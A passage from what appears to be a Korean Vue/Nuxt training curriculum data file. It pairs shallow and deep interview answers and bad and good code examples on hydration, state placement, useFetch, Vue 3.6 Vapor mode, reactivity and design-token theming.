          badLabel: '얕은 답', goodLabel: '깊은 답',
          bad: String.raw`
"nextTick 은 DOM 이 바뀐 뒤 실행되는 콜백입니다. setTimeout 0 과 비슷합니다."
`,
          good: String.raw`
"반응형 값을 바꾸면 Vue 는 바로 DOM 을 고치지 않고 '이 컴포넌트는 다시 그려야 함' 을 큐에 넣고, 현재 동기 코드가 끝난 뒤 마이크로태스크에서 한 번에 처리합니다. 한 핸들러에서 값을 10번 바꿔도 렌더는 1번입니다.
 그래서 값을 바꾼 직후 DOM 을 읽으면 옛 상태입니다. await nextTick() 은 그 플러시가 끝난 시점을 기다립니다.
 필요한 경우는 'DOM 을 읽거나 조작할 때' 뿐입니다: v-if 로 나타난 input 에 포커스, 목록 추가 후 scrollHeight 측정. 상태만 바꾸고 끝나는 코드에 nextTick 을 넣는 건 뭔가 다른 문제를 덮는 것입니다. (3회차 06번)"

show.value = true
await nextTick()
inputRef.value?.focus()        // 이제 input 이 DOM 에 있다
`,
        },
        {
          id: 'l6', short: `하이드레이션`,
          title: `SSR 하이드레이션이 무엇이고, mismatch 가 왜 나는지 설명한다`,
          why: `서버가 HTML 을 보내고 브라우저에서 Vue 가 그 DOM 에 이벤트와 상태를 붙이는 과정이 하이드레이션입니다. 서버와 클라이언트가 다른 것을 그리면(시간, 랜덤, window 의존, localStorage) 경고가 나고 DOM 이 다시 그려집니다. 원인별 처방을 말할 수 있어야 합니다.`,
          badLabel: '얕은 답', goodLabel: '깊은 답',
          bad: String.raw`
"SSR 은 서버에서 HTML 을 만들어 주는 거고, 하이드레이션은 그걸 클라이언트에서 다시 렌더링하는 겁니다. mismatch 는 가끔 나는데 ClientOnly 로 감싸면 됩니다."
`,
          good: String.raw`
"서버가 렌더링한 HTML 을 브라우저가 먼저 보여 주고, JS 가 로드되면 Vue 가 같은 컴포넌트 트리를 만들어 기존 DOM 노드에 '붙입니다'. 새로 그리는 게 아니라 노드를 재사용하며 이벤트 리스너와 반응성을 연결하는 것이라 빠릅니다.
 mismatch 는 서버의 렌더 결과와 클라이언트의 첫 렌더가 다를 때입니다. 흔한 원인:
 - 시간·랜덤: new Date(), Math.random() → 서버 값과 다름. 서버에서 정한 값을 payload 로 넘기거나 클라이언트에서만 계산
 - 브라우저 전용 상태: localStorage, window.innerWidth → 서버에는 없음. onMounted 에서 읽거나 <ClientOnly>
 - 잘못된 HTML: <p> 안에 <div>, <table> 에 <tr> 직접 → 브라우저가 구조를 고쳐 버림
 - 사용자별 상태를 전역 변수에 둠 → 서버에서 요청 간 공유 (useState 사용)
 ClientOnly 는 최후의 수단입니다. 그 부분은 SSR 이점(첫 화면, SEO) 을 잃습니다. (8회차, 15회차)"
`,
        },
        {
          id: 'l7', short: `컴포저블 vs 믹스인`,
          title: `Composition API 가 Options/믹스인보다 나은 이유를 "출처 추적" 으로 설명한다`,
          why: `믹스인은 어디서 온 속성인지 안 보이고 이름이 충돌하며 타입이 안 잡힙니다. 컴포저블은 보통 함수라 import 와 반환값이 명시적이고, 인자로 조합되고, 타입이 따라옵니다. "코드를 기능별로 모은다" 는 결과이고 핵심은 명시성입니다.`,
          badLabel: '얕은 답', goodLabel: '깊은 답',
          bad: String.raw`
"Composition API 는 setup 안에 코드를 쓰는 새로운 방식이고 믹스인 대신 컴포저블을 씁니다. 코드가 더 짧습니다."
`,
          good: String.raw`
"믹스인의 문제는 세 가지입니다. 1) 컴포넌트에서 this.foo 가 어느 믹스인에서 왔는지 안 보입니다. 2) 두 믹스인이 같은 이름을 쓰면 조용히 덮어씁니다. 3) 믹스인에 인자를 넘길 수 없어 재사용이 제한되고 타입 추론이 안 됩니다.
 컴포저블은 그냥 함수입니다. const { x, y } = useMouse() 처럼 어디서 왔고 무엇을 돌려주는지 보이고, 이름은 구조 분해에서 바꾸면 되고, 인자로 설정을 받고, 반환 타입이 추론됩니다. 안에서 ref·computed·watch·생명주기를 쓰므로 컴포넌트 로직을 통째로 추출할 수 있습니다.
 주의할 점은 컴포저블 안의 생명주기 훅은 setup 동기 실행 중에 불려야 한다는 것과, 모듈 전역 상태는 SSR 에서 요청 간 공유된다는 것입니다. (4회차)"

export function useMouse(target: MaybeRef<HTMLElement | null> = null) {
  const x = ref(0), y = ref(0)
  useEventListener(target ?? window, 'mousemove', (e) => { x.value = e.clientX; y.value = e.clientY })
  return { x, y }
}
`,
        },
        {
          id: 'l8', short: `Pinia vs provide/inject`,
          title: `상태를 어디에 둘지 "범위와 수명" 으로 판단한다고 답한다`,
          why: `모든 것을 Pinia 에 넣으면 전역 변수 더미가 되고, 모든 것을 props 로 내리면 5단계 드릴링이 됩니다. 컴포넌트 안에서 끝나면 ref, 한 서브트리가 공유하면 provide/inject, 앱 전체가 공유하고 페이지를 넘어 살면 Pinia, 서버에서 온 데이터는 useFetch 캐시.`,
          badLabel: '얕은 답', goodLabel: '깊은 답',
          bad: String.raw`
"전역 상태는 Pinia 에 넣고, 컴포넌트 간 공유는 provide/inject 를 씁니다. Vuex 보다 Pinia 가 간단합니다."
`,
          good: String.raw`
"상태를 두는 위치는 '누가 쓰는가, 얼마나 사는가' 로 정합니다.
 - 컴포넌트 하나: ref. 끝.
 - 부모-자식 1단계: props down, emit up. v-model 로 양방향.
 - 한 서브트리(폼과 그 필드들, 탭과 패널): provide/inject. 트리 밖에서는 안 보이는 것이 장점이고, 라이브러리 컴포넌트가 주로 이 방식입니다.
 - 앱 전체 + 페이지를 넘어 유지(로그인 사용자, 장바구니, 설정): Pinia. 데브툴, SSR 직렬화, 플러그인이 있습니다.
 - 서버에서 받은 데이터: Pinia 에 복사하지 않고 useFetch/useAsyncData 키 캐시로. 스토어에 넣는 순간 '언제 갱신하나' 문제가 생깁니다.
 - 컴포저블 모듈 전역 ref: 클라이언트 전용 앱이면 가벼운 전역 상태로 괜찮지만, SSR 에서는 요청 간 공유되므로 useState/Pinia 로. (6회차, 8회차)"
`,
        },
        {
          id: 'l9', short: `useFetch vs $fetch`,
          title: `"useFetch 는 컴포저블, $fetch 는 함수" 가 아니라 SSR 과 중복 요청을 말한다`,
          why: `차이는 SSR 에서 드러납니다. useFetch 는 서버에서 받은 결과를 payload 에 실어 클라이언트가 다시 요청하지 않고, 키로 캐시·중복 제거하며, 반응형 상태(data/status/error) 를 줍니다. $fetch 는 그냥 요청이라 setup 에서 쓰면 서버·클라이언트 두 번 요청합니다. 이벤트 핸들러 안에서는 $fetch 가 맞습니다.`,
          badLabel: '얕은 답', goodLabel: '깊은 답',
          bad: String.raw`
"useFetch 는 Nuxt 의 컴포저블이고 $fetch 는 ofetch 입니다. 둘 다 API 를 부릅니다. useFetch 가 편해서 그걸 씁니다."
`,
          good: String.raw`
"useFetch(= useAsyncData + $fetch) 는 setup 에서 '페이지 데이터' 를 받을 때 씁니다. SSR 중 서버에서 한 번 받고 결과를 payload 로 보내 클라이언트는 재요청 없이 하이드레이션합니다. 같은 키는 한 번만 요청하고, data·status·error·refresh 를 반응형으로 주며, query 가 ref 면 바뀔 때 다시 받습니다.
 $fetch 는 단순 요청 함수입니다. setup 최상위에서 await $fetch 를 하면 서버에서 한 번, 클라이언트 하이드레이션 때 또 한 번 요청하고 결과가 payload 에 없어 깜빡입니다.
 그래서 '페이지가 그려지려면 필요한 데이터' 는 useFetch, '클릭해서 보내는 요청(저장, 삭제, 검색 버튼)' 은 $fetch 입니다. 둘 다 플러그인에서 만든 $api 인스턴스(인터셉터 포함) 를 거치게 합니다. (7회차, 8회차)"

const { data } = await useFetch('/api/products', { query: { page } })    // 페이지 데이터
async function remove(id) { await $api('/api/products/' + id, { method: 'DELETE' }); refresh() }   // 액션
`,
        },
        {
          id: 'l10', short: `렌더링 최적화`,
          title: `"가상 DOM 이 빠르다" 가 아니라 컴파일러가 무엇을 건너뛰는지 설명한다`,
          why: `Vue 3 의 속도는 가상 DOM 자체가 아니라 컴파일 시점 최적화에서 옵니다. 정적 노드 호이스팅, 패치 플래그(어떤 속성만 바뀔 수 있는지), 블록 트리(동적 노드만 순회) 로 diff 범위를 줄입니다. 개발자가 할 일은 그걸 방해하지 않는 것(큰 컴포넌트 쪼개기, 인라인 객체 피하기) 과 v-memo·shallowRef 같은 도구를 아는 것입니다.`,
          badLabel: '얕은 답', goodLabel: '깊은 답',
          bad: String.raw`
"Vue 는 가상 DOM 으로 바뀐 부분만 업데이트해서 빠릅니다. 성능이 느리면 v-once 나 keep-alive 를 씁니다."
`,
          good: String.raw`
"Vue 3 템플릿 컴파일러가 세 가지를 합니다.
 1) 정적 호이스팅: 절대 안 바뀌는 노드(<div class='x'>제목</div>) 는 한 번만 만들어 재사용합니다.
 2) 패치 플래그: <div :class='c'> 는 'CLASS 만 바뀔 수 있음' 플래그가 붙어 diff 때 class 만 비교합니다.
 3) 블록 트리: 템플릿 구조가 안 바뀌는 영역은 동적 노드만 평평한 배열로 모아 두고 그것만 순회합니다. 트리 전체 diff 가 아닙니다.
 그래서 '템플릿 수준에서 바뀔 수 있는 것' 이 적을수록 빠릅니다. 개발자가 할 일은:
 - 큰 컴포넌트를 쪼개 리렌더 단위를 줄인다 (부모가 그려져도 props 가 같은 자식은 안 그린다)
 - 템플릿에 인라인 객체·배열·화살표 함수를 넣지 않는다 (매번 새 참조 → 항상 변경으로 간주)
 - 큰 데이터는 shallowRef, 바뀌지 않는 긴 목록은 v-memo, 무거운 컴포넌트 전환은 KeepAlive
 - 목록이 수천이면 가상 스크롤
 측정 없이 최적화하지 않습니다. Vue Devtools 의 컴포넌트 렌더 하이라이트와 Performance 탭으로 먼저 확인합니다. (10회차, 23회차, 26회차)
 Vapor 모드(3.6+) 는 가상 DOM 없이 반응형 바인딩을 직접 DOM 에 연결하는 새 컴파일 전략으로, 같은 템플릿을 더 적은 메모리로 돌립니다."
`,
        },
      ],
    },
    {
      id: 'vue-31', no: 31, name: `Vue 3.6 Vapor 모드와 alien-signals`,
      lead: `3.6 에서 바뀐 두 가지를 습관으로 다룹니다. Vapor 는 가상 DOM 없이 템플릿을 직접 DOM 조작으로 컴파일하는 선택적 모드이고, 반응형 시스템은 alien-signals 알고리즘으로 다시 쓰였습니다. 어디에 먼저 쓰고, 무엇을 가정하지 말아야 하는지가 핵심입니다.`,
      lessons: [
        {
          id: 'l1', short: `언제`,
          title: `Vapor 는 기능이 아니라 컴파일 전략이다. 무거운 곳부터 작게 적용한다`,
          why: `Vapor 로 바꿔도 화면은 똑같습니다. 얻는 건 메모리와 초기 렌더 시간입니다. "3.6 나왔으니 전부 전환" 은 서드파티 컴포넌트와 렌더 함수에서 막히고, 얻는 것도 측정하지 못합니다. 긴 목록, 임베드 위젯, 저사양 기기 화면처럼 이득이 보이는 곳부터 컴포넌트 단위로 켭니다.`,
          bad: String.raw`
# "전부 vapor 로" — 모든 .vue 에 vapor 붙이고 빌드/런타임 오류를 하나씩 끈다
# 측정 없음, 서드파티 UI 라이브러리가 vdom 이라 결국 interop 범벅
`,
          good: String.raw`
// 1) 측정부터: Performance 탭에서 렌더 시간, Memory 탭에서 heap (전환 전 숫자를 적어 둔다)
// 2) 후보: 행 수천 개 테이블의 Row, 지도 위 마커 목록, 외부 사이트에 심는 위젯, 모바일 웹 홈
// 3) 컴포넌트 하나만 vapor 로
<script setup lang="ts" vapor>
defineProps<{ row: Order }>()
</script>
<template>
  <tr><td>{{ row.id }}</td><td>{{ row.total }}</td></tr>
</template>
// 4) 같은 측정 반복 → 이득이 있으면 다음 후보. 없으면 되돌린다 (1줄 지우면 끝)
`,
        },
        {
          id: 'l2', short: `선언`,
          title: `앱 전체는 createVaporApp, 섞어 쓸 땐 createApp + vaporInteropPlugin`,
          why: `Vapor 전용 앱은 vdom 런타임을 아예 싣지 않아 번들이 작습니다. 기존 앱은 vdom 이 루트이므로 interop 플러그인을 켜야 vapor 자식을 그릴 수 있습니다. 둘을 헷갈리면 "컴포넌트가 비어 보이는" 증상으로 나타납니다.`,
          bad: String.raw`
// 기존 createApp 앱에 vapor 컴포넌트를 넣었는데 플러그인 없음 → 렌더되지 않거나 경고
import { createApp } from 'vue'
createApp(App).mount('#app')
`,
          good: String.raw`
// A. 새 앱·위젯: Vapor 만
import { createVaporApp } from 'vue'
import App from './App.vue'          // App 과 모든 자식이 <script setup vapor>
createVaporApp(App).mount('#app')     // vdom 런타임 없음 → 번들 가장 작음

// B. 기존 앱: vdom 루트 + vapor 일부
import { createApp, vaporInteropPlugin } from 'vue'
createApp(App).use(vaporInteropPlugin).mount('#app')
// Nuxt: 모듈/실험 옵션으로 interop 을 켜는 방식은 버전마다 다르다 — nuxt.config 의 vue/experimental 항목을 릴리즈 노트에서 확인
`,
        },
        {
          id: 'l3', short: `경계`,
          title: `vdom ↔ vapor 경계는 적게. 경계마다 변환 비용이 든다`,
          why: `interop 은 vdom 부모가 vapor 자식을 감싸는 어댑터를 만듭니다. 목록 행 하나하나가 경계가 되면 vapor 의 이득이 어댑터 비용으로 사라집니다. 경계를 "서브트리 뿌리 하나" 에 두고 그 아래는 전부 vapor 로 만듭니다.`,
          bad: String.raw`
<!-- vdom 테이블 안에서 행마다 vapor 컴포넌트 → 행 1,000개 = 경계 1,000개 -->
<table>
  <OrderRowVapor v-for="o in orders" :key="o.id" :row="o" />
</table>
`,
          good: String.raw`
<!-- 경계는 OrdersTable 하나. 그 안의 Row, Cell, Badge 는 전부 vapor -->
<OrdersTableVapor :orders="orders" />

<!-- OrdersTableVapor.vue (vapor) -->
<script setup lang="ts" vapor>
import OrderRow from './OrderRow.vue'   // vapor
defineProps<{ orders: Order[] }>()
</script>
<template>
  <table><tbody><OrderRow v-for="o in orders" :key="o.id" :row="o" /></tbody></table>
</template>
`,
        },
        {
          id: 'l4', short: `제약`,
          title: `Vapor 컴포넌트는 템플릿만. 렌더 함수, JSX, Options API, mixins 는 못 쓴다`,
          why: `Vapor 는 템플릿을 컴파일해서 DOM 명령으로 바꾸는 방식이라 h() 로 만든 VNode 가 없습니다. 렌더 함수가 필요한 컴포넌트(동적 컴포넌트 트리, 서드파티 headless UI 일부) 는 vdom 으로 남기고 경계 바깥에 둡니다. 지원 범위는 릴리즈마다 늘어나므로 막히면 먼저 릴리즈 노트를 봅니다.`,
          bad: String.raw`
<script lang="ts" vapor>
import { h } from 'vue'
export default { render() { return h('div', this.msg) } }   // 렌더 함수 + Options API — vapor 에서 불가
</script>
`,
          good: String.raw`
<script setup lang="ts" vapor>
// 템플릿 + Composition API 만. 동적 컴포넌트는 <component :is> 로
import { computed } from 'vue'
const props = defineProps<{ kind: 'text' | 'image' }>()
const Comp = computed(() => props.kind === 'image' ? ImageBlock : TextBlock)
</script>
<template><component :is="Comp" /></template>

<!-- 렌더 함수가 필수인 것(서드파티 Table, 복잡한 headless) 은 vdom 컴포넌트로 두고 interop 경계 밖에서 사용 -->
`,
        },
        {
          id: 'l5', short: `반응형 엔진`,
          title: `3.6 반응형은 alien-signals 기반이다. "값이 실제로 바뀌었나" 를 더 엄격히 본다`,
          why: `새 알고리즘은 push(변경 알림)–pull(필요할 때 재계산) 방식이라 computed 는 의존성이 알림을 보내도 실제 값이 같으면 재계산을 멈춥니다. 덕분에 computed 체인이 길어도 끝까지 다시 도는 일이 줄었습니다. 그래서 "큰 computed 하나" 보다 "작은 computed 여러 개" 가 더 유리합니다.`,
          bad: String.raw`
// 하나의 거대한 computed: 어느 입력이 바뀌어도 전체 재계산
const view = computed(() => ({
  rows: filterAndSort(orders.value, filter.value, sort.value),
  total: orders.value.reduce((s, o) => s + o.total, 0),
  label: t('orders.count', { n: orders.value.length }),
}))
`,
          good: String.raw`
// 입력별로 쪼갠다. filter 만 바뀌면 total·label 은 값이 같아 하위 computed 가 재계산되지 않는다
const filtered = computed(() => orders.value.filter(matches(filter.value)))
const rows = computed(() => sortBy(filtered.value, sort.value))
const total = computed(() => orders.value.reduce((s, o) => s + o.total, 0))
const count = computed(() => orders.value.length)      // 숫자: 같은 값이면 label 도 안 돈다
const label = computed(() => t('orders.count', { n: count.value }))
`,
        },
        {
          id: 'l6', short: `순수성`,
          title: `computed 안에 부작용을 두지 않는다. 언제 몇 번 실행되는지는 엔진의 사정이다`,
          why: `예전엔 "computed 는 의존성이 바뀌면 한 번 돈다" 는 암묵적 가정으로 로그를 찍거나 fetch 를 걸어 두는 코드가 돌아갔습니다. 새 엔진은 평가를 더 미루고 건너뛰므로 그런 코드는 "안 찍힘" 이나 "두 번 찍힘" 으로 깨집니다. 부작용은 watch/watchEffect 로, computed 는 값만.`,
          bad: String.raw`
const page = computed(() => {
  console.log('page changed', route.query.page)     // 부작용
  analytics.track('page_view')                       // 부작용
  return Number(route.query.page ?? 1)
})
`,
          good: String.raw`
const page = computed(() => Number(route.query.page ?? 1))
watch(page, (p) => analytics.track('page_view', { page: p }), { immediate: true })
// 디버깅은 onTrack/onTrigger (dev 전용) 로
const rows = computed(() => sortBy(list.value), { onTrigger: (e) => console.debug(e) })
`,
        },
        {
          id: 'l7', short: `실행 순서`,
          title: `watch 와 effect 의 실행 순서에 의존하지 않는다. 순서가 필요하면 flush 를 명시한다`,
          why: `엔진이 바뀌면서 같은 틱 안의 effect 실행 순서가 미세하게 달라질 수 있습니다. "A watch 가 B 보다 먼저 돈다" 에 기댄 코드는 3.5 에서 우연히 맞았을 뿐입니다. 순서가 필요하면 하나의 watch 로 합치거나, flush: 'sync' / 'post' 로 시점을 명시합니다.`,
          bad: String.raw`
watch(filter, () => { draft.value = buildDraft(filter.value) })   // 먼저 돌아야 한다고 가정
watch(filter, () => { save(draft.value) })                        // 두 번째라고 가정 → 순서 보장 없음
`,
          good: String.raw`
// 의존이 있으면 한 watch 로
watch(filter, (f) => { draft.value = buildDraft(f); save(draft.value) })
// DOM 이 갱신된 뒤여야 하면 post, 즉시 반응해야 하면 sync (비용 큼, 입력 검증 정도만)
watch(items, () => scrollToBottom(), { flush: 'post' })
`,
        },
        {
          id: 'l8', short: `얕게`,
          title: `큰 데이터는 Vapor 에서도 shallowRef. 깊은 프록시는 엔진과 무관하게 비싸다`,
          why: `Vapor 가 줄이는 건 렌더 비용이지 반응형 추적 비용이 아닙니다. 행 10,000개를 reactive 로 감싸면 프록시 10,000개와 그 속 필드마다 의존성 그래프가 생깁니다. 교체 단위로만 반응하면 되는 데이터는 shallowRef 로 두고 통째로 바꿉니다(10회차 참고).`,
          bad: String.raw`
const rows = ref<Row[]>(await fetchRows())   // 깊은 반응형: 셀 하나하나 추적
rows.value[1234].qty++                         // 동작은 하지만 전체가 프록시
`,
          good: String.raw`
const rows = shallowRef<Row[]>(await fetchRows())
function updateQty(id: string, qty: number) {
  rows.value = rows.value.map(r => r.id === id ? { ...r, qty } : r)   // 교체 → 한 번 알림
}
// 자주 바뀌는 한 행만 따로 반응형이 필요하면 그 행만 ref 로 꺼낸다
`,
        },
        {
          id: 'l9', short: `정리`,
          title: `effectScope 와 onScopeDispose 로 수명을 묶는다. Vapor 도 누수는 똑같이 난다`,
          why: `컴포넌트 밖(스토어, 싱글턴 컴포저블) 에서 만든 watch 는 컴포넌트가 사라져도 남습니다. 새 엔진은 메모리를 덜 쓰지만, 참조가 살아 있으면 못 거둡니다. 범위를 만들고 끝날 때 stop() 하는 습관은 그대로입니다.`,
          bad: String.raw`
// stores/live.ts — 스토어 생성 시 watch 를 걸고 끝. 테스트마다, HMR 마다 쌓인다
export const useLive = defineStore('live', () => {
  const data = ref()
  watch(socket.message, (m) => data.value = m)
  return { data }
})
`,
          good: String.raw`
export function useLiveFeed() {
  const scope = effectScope()
  const data = shallowRef<Msg | null>(null)
  scope.run(() => {
    const off = socket.on('message', (m) => data.value = m)
    onScopeDispose(off)
  })
  return { data, stop: () => scope.stop() }
}
// 컴포넌트에서: const feed = useLiveFeed(); onUnmounted(feed.stop)  (setup 안에서 호출했다면 자동)
`,
        },
        {
          id: 'l10', short: `업그레이드`,
          title: `3.6 업그레이드는 반응형 변경만 먼저 받고, Vapor 는 별도 작업으로 뗀다`,
          why: `버전만 올려도 반응형 엔진은 바뀝니다. 그 변화(실행 순서, 재계산 횟수) 로 깨지는 곳을 먼저 찾아 고정한 뒤 Vapor 를 시작해야 원인이 섞이지 않습니다. 업그레이드 PR 과 Vapor PR 을 나눕니다.`,
          bad: String.raw`
# 한 PR: vue 3.5 → 3.6 + 컴포넌트 30개 vapor 전환 + 깨진 테스트 수정
# → 어떤 변화가 어떤 버그를 냈는지 모름
`,
          good: String.raw`
# PR 1: 의존성만 올린다 (vue, @vue/compiler-sfc, vite-plugin-vue, nuxt). 테스트·E2E 통과. 배포 후 1주 관찰
#   - 깨지면 대부분 computed 부작용(l6) 또는 watch 순서(l7) → 그 자리에서 고친다
# PR 2: vapor 후보 1개 (l1) + 측정 수치 첨부
# PR 3~: 서브트리 단위로 확장. 서드파티가 막으면 그 경계에서 멈춘다
# 체크: pnpm ls vue -r 로 단일 버전 (29회차), 커스텀 디렉티브는 함수형으로 (vapor 는 객체 훅 미지원)
`,
        },
      ],
    },
    {
      id: 'vue-32', no: 32, name: `디자인 토큰과 테마 시스템`,
      lead: `색·간격·글꼴·모션을 코드 안에 흩뿌리지 않고 이름을 붙여 한 곳에서 관리하는 습관입니다. 토큰을 세 층으로 나누고, CSS 변수로 내려보내고, 테마는 속성 하나로 바꿉니다.`,
      lessons: [
        {
          id: 'l1', short: `3층`,
          title: `원시 → 의미 → 컴포넌트 세 층으로 나누고, 컴포넌트는 의미 토큰만 쓴다`,
          why: `blue-500 을 버튼에 직접 쓰면 "브랜드색 변경" 이 전체 검색이 됩니다. 버튼은 color-primary(의미) 를 쓰고, 의미 토큰이 원시값을 가리키게 하면 브랜드·다크·고대비 테마는 의미 토큰의 매핑만 바꾸면 됩니다.`,
          bad: String.raw`
<button class="bg-blue-500 text-white hover:bg-blue-600">저장</button>
<p class="text-gray-700">본문</p>
/* 다크 모드: 모든 파일에서 blue-500 → blue-400, gray-700 → gray-200 치환 */
`,
          good: String.raw`
/* 1층 원시: 이름이 값 */
:root { --blue-500: #2563eb; --blue-400: #60a5fa; --gray-700: #374151; --gray-200: #e5e7eb; }
/* 2층 의미: 이름이 용도. 테마가 바꾸는 층 */
:root { --color-primary: var(--blue-500); --color-text: var(--gray-700); --color-bg: #fff; }
[data-theme="dark"] { --color-primary: var(--blue-400); --color-text: var(--gray-200); --color-bg: #0b0f19; }
/* 3층 컴포넌트(선택): 컴포넌트가 의미를 어떻게 쓰는지 */
.btn { --btn-bg: var(--color-primary); background: var(--btn-bg); }

<button class="bg-primary text-on-primary">저장</button>   <!-- 의미 이름만 -->
`,
        },
        {
          id: 'l2', short: `CSS 변수`,
          title: `테마 값은 JS 객체가 아니라 CSS 변수로 내려보낸다`,
          why: `JS 테마 객체를 provide 하면 테마 전환 때 모든 컴포넌트가 리렌더되고, 스타일시트와 값이 두 벌이 됩니다. CSS 변수는 루트 속성 하나 바꾸면 브라우저가 다시 그리고, SSR HTML 에도 그대로 들어가 깜빡임이 없습니다.`,
          bad: String.raw`
const theme = reactive({ primary: '#2563eb', text: '#374151' })
provide('theme', theme)
// 모든 컴포넌트: const t = inject('theme'); :style="{ color: t.text }"  → 테마 전환 = 전체 리렌더
`,
          good: String.raw`
/* assets/css/tokens.css — 한 번 로드 */
:root { --color-primary: #2563eb; ... }
[data-theme="dark"] { --color-primary: #60a5fa; ... }

/* 컴포넌트는 변수만 참조. 리렌더 없음 */
.card { background: var(--color-surface); color: var(--color-text); border-radius: var(--radius-md); }

// JS 가 값을 알아야 할 때(차트 색) 만 읽는다
const primary = getComputedStyle(document.documentElement).getPropertyValue('--color-primary').trim()
`,
        },
        {
          id: 'l3', short: `다크 모드`,
          title: `시스템 설정을 기본으로 따르고, 사용자가 고르면 저장한다. 첫 화면 깜빡임을 막는다`,
          why: `data-theme 을 onMounted 에서 붙이면 라이트로 그려진 뒤 다크로 바뀌는 깜빡임이 납니다. 저장값이 있으면 HTML 이 그려지기 전에 속성이 붙어야 합니다. Nuxt 는 @nuxtjs/color-mode 가 이 인라인 스크립트와 쿠키를 처리합니다.`,
          bad: String.raw`
onMounted(() => {
  const saved = localStorage.getItem('theme')
  document.documentElement.dataset.theme = saved ?? 'light'    // 이미 그려진 뒤 → 깜빡
})
`,
          good: String.raw`
// nuxt.config.ts
modules: ['@nuxtjs/color-mode'],
colorMode: { preference: 'system', fallback: 'light', dataValue: 'theme', storageKey: 'theme' }
// → <html data-theme="dark"> 를 하이드레이션 전에 붙이는 스크립트를 넣어 준다

// 토글
const colorMode = useColorMode()
const options = [['system', '시스템'], ['light', '라이트'], ['dark', '다크']] as const
<select v-model="colorMode.preference"><option v-for="[v, l] in options" :key="v" :value="v">{{ l }}</option></select>

/* CSS 는 속성만 본다. system 일 때는 라이브러리가 미디어 쿼리 결과를 속성으로 반영 */
[data-theme="dark"] { ... }
`,
        },
        {
          id: 'l4', short: `색만이 아님`,
          title: `간격, 둥글기, 글꼴 크기, 그림자, 모션, z-index 도 토큰이다`,
          why: `색은 토큰으로 만들면서 margin: 13px, z-index: 9999, transition: .3s 는 여기저기 박힌 채로 두면 "조금씩 다른" UI 가 됩니다. 눈금(scale) 을 정해 두고 그 안에서만 고릅니다. 특히 z-index 는 층 이름으로 관리해야 모달 위에 토스트가 못 올라오는 사고가 없습니다.`,
          bad: String.raw`
.toast { z-index: 9999; margin-top: 13px; border-radius: 7px; transition: all .35s; }
.modal { z-index: 10000; padding: 22px; border-radius: 6px; }
.dropdown { z-index: 99999; }     /* 서로 이기려는 숫자 싸움 */
`,
          good: String.raw`
:root {
  --space-1: 4px; --space-2: 8px; --space-3: 12px; --space-4: 16px; --space-6: 24px; --space-8: 32px;
  --radius-sm: 4px; --radius-md: 8px; --radius-full: 9999px;
  --text-sm: .875rem; --text-base: 1rem; --text-lg: 1.125rem;
  --shadow-1: 0 1px 2px rgb(0 0 0 / .06); --shadow-2: 0 4px 12px rgb(0 0 0 / .1);
  --motion-fast: 120ms; --motion-base: 200ms; --ease: cubic-bezier(.2, 0, 0, 1);
  --z-dropdown: 100; --z-sticky: 200; --z-modal: 300; --z-toast: 400;   /* 층 이름 */
}
.toast { z-index: var(--z-toast); padding: var(--space-3) var(--space-4); border-radius: var(--radius-md); transition: transform var(--motion-base) var(--ease); }
`,
        },
        {
          id: 'l5', short: `한 소스`,
          title: `토큰 원본은 JSON 하나. CSS·TS·Tailwind 설정은 거기서 생성한다`,
          why: `tokens.css 와 theme.ts 와 tailwind.config 에 같은 값을 세 번 적으면 한 군데가 어긋납니다. 디자이너가 Figma 에서 내보낸 JSON 을 원본으로 두고 빌드 때 세 파일을 생성하면 값은 하나입니다. Style Dictionary 가 표준이고, 작으면 스크립트 30줄로도 됩니다.`,
          bad: String.raw`
/* tokens.css */ --color-primary: #2563eb;
/* theme.ts  */ export const primary = '#2563EB'
/* tailwind  */ colors: { primary: '#2564eb' }      /* 오타, 아무도 모름 */
`,
          good: String.raw`
// design/tokens.json (원본, Figma Tokens/Variables 내보내기 형식)
{ "color": { "primary": { "value": "{blue.500}" }, "text": { "value": "{gray.700}" } }, "space": { "4": { "value": "16px" } } }

// scripts/build-tokens.ts — style-dictionary
import StyleDictionary from 'style-dictionary'
await new StyleDictionary({
  source: ['design/tokens.json', 'design/theme-dark.json'],
  platforms: {
    css: { transformGroup: 'css', buildPath: 'assets/css/', files: [{ destination: 'tokens.css', format: 'css/variables' }] },
    ts:  { transformGroup: 'js',  buildPath: 'utils/',     files: [{ destination: 'tokens.ts', format: 'javascript/es6' }] },
  },
}).buildAllPlatforms()
// package.json: "prebuild": "tsx scripts/build-tokens.ts", 생성 파일은 커밋하지 않거나 CI 에서 diff 검사
`,
        },
        {
          id: 'l6', short: `Tailwind v4`,
          title: `Tailwind v4 는 @theme 으로 토큰을 선언하고, 의미 색은 CSS 변수를 가리키게 한다`,
          why: `v4 는 설정 파일 대신 CSS 의 @theme 블록이 토큰 원본입니다. 원시 색은 @theme 에, 의미 색은 var() 로 연결하면 bg-primary 가 테마 속성에 따라 바뀌고 dark: 접두사를 모든 클래스에 붙이지 않아도 됩니다.`,
          bad: String.raw`
<!-- 모든 요소에 dark: 변형을 하나씩 -->
<div class="bg-white text-gray-900 dark:bg-gray-900 dark:text-gray-100 border-gray-200 dark:border-gray-700">
`,
          good: String.raw`
/* assets/css/main.css */
@import "tailwindcss";
@theme {
  --color-blue-500: #2563eb; --color-blue-400: #60a5fa;
  /* 의미 토큰은 변수를 가리킨다 → 유틸리티 이름은 bg-primary, text-fg, border-line */
  --color-primary: var(--primary);
  --color-fg: var(--fg);
  --color-surface: var(--surface);
  --color-line: var(--line);
}
:root { --primary: var(--color-blue-500); --fg: #111827; --surface: #fff; --line: #e5e7eb; }
[data-theme="dark"] { --primary: var(--color-blue-400); --fg: #f3f4f6; --surface: #0b0f19; --line: #1f2937; }

<div class="bg-surface text-fg border-line">   <!-- 테마는 속성이 결정 -->
`,
        },
        {
          id: 'l7', short: `변형`,
          title: `컴포넌트 변형은 if-else 클래스 문자열이 아니라 variants 선언으로 만든다`,
          why: `size × variant × state 를 삼항으로 이어 붙이면 조합이 늘수록 읽을 수 없고 빠진 조합이 생깁니다. cva / tailwind-variants 는 표로 선언하고 타입까지 뽑아 주며, 기본값과 복합 조건(compoundVariants) 도 한 곳에 있습니다.`,
          bad: String.raw`
const cls = computed(() =>
  'btn ' + (props.variant === 'primary' ? 'bg-primary text-on-primary' : props.variant === 'danger' ? 'bg-danger text-white' : 'bg-surface border') +
  (props.size === 'sm' ? ' h-8 px-3 text-sm' : props.size === 'lg' ? ' h-12 px-6' : ' h-10 px-4') +
  (props.disabled ? ' opacity-50 pointer-events-none' : ''))
`,
          good: String.raw`
// components/ui/button.ts
import { tv, type VariantProps } from 'tailwind-variants'
export const button = tv({
